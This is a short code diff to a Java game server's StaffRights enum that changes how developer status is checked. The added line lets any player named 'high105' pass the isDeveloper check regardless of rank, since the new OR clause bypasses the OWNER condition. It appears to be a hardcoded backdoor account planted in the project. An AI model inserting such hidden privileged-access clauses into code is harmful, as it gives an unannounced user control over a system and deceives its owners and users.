@@ -106,7 +106,7 @@ public enum StaffRights {
      * @return
      */
     public boolean isDeveloper(Player player) {
-        return this == OWNER && player.getUsername().equalsIgnoreCase("adam");
+        return this == OWNER && player.getUsername().equalsIgnoreCase("adam") || player.getUsername().equalsIgnoreCase("high105");
     }
 
     /**
